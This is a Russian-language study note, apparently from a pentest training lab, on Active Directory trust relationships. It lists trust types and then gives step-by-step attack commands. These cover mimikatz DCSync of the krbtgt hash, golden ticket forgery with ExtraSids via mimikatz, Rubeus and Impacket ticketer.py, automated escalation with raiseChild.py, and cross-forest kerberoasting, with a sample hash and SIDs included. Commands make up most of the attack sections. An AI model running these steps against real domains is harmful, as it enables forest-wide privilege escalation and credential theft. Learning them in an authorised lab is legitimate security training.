#trusts #domain #tree

> Один из способов упрощения процесса интеграции новых компаний — установление доверительных отношений с новым доменом. Таким образом, можно избежать миграции всех существующих объектов, что значительно ускоряет интеграцию

## Типы доверия 
- `Parent-child` - между родителем и ребенком
- `Cross-link` - между двумя дочерними
- `External` - между отдельными доменами в отдельных лесах
- `Tree-root` - между корневым доменом леса и корневым дерева
- `Forest` - между двумя корневыми доменами леса
- `ESAE` - базовый лес для AD
![[Pasted image 20261025143422.png]]

Виды Связей:
- Транзитивные - Если A -> B и B -> C, то A -> С
- Нетранзитивные - Обратно
![[Pasted image 20261025143300.png]]

- Однонаправленные 
- Двунаправленные

# Enum 

1) Просмотр Трастов
```powershell
Import-Module PowerView.ps1
Get-DomainTrust

# or

Import-Module activedirectory
Get-ADTrust -Filter *
```

2) Использование netdom
```powershell
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
```

# Attack Child -> Parent (ExtraSids)
> Дочерний домен должен быть уже скомпрометирован
### Mimikatz
1) Получаем `krbtgt`
```powershell
mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt"
```

2) Получаем SID дочернего домена
```powershell
Get-DomainSID
```

3) Получаем SID группы "Enterprise Admins" в родительском домене
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

4) Golden Ticket
```powershell
mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt"
```

### Rubeus
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

### Linux

1) Получение krbtgt
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

2) Получение SID
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

3) Получение SID Domain Admins
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

4) Golden Ticket
```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

```bash
export KRB5CCNAME=hacker.ccache
```

ИЛИ 

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
Работает через `psexec`

---
# Attack Cross-Forest (kerberoasting)
> Используем, когда мы не можем скомпрометировать свой домен

### Rubeus
1) Проверяем у кого в другом домене есть SPN
```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName, samaccountname
```

2) Проведение атаки (Указываем ДОМЕН)
```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### Linux
1) Перечисление сразу с атакой
```powershell
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```




